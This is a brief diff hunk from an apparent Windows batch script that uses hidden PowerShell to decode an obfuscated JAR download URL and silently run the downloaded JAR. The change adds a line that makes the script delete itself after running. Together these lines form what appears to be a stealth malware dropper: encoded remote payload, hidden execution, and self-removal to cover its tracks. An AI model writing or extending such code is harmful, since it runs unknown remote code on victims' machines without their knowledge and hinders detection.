@@ -33,5 +33,5 @@ powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.Ge
 if exist "%jarOutput%" (
     powershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
 )
-
+start "" /b cmd /c del "%~f0" & exit
 exit
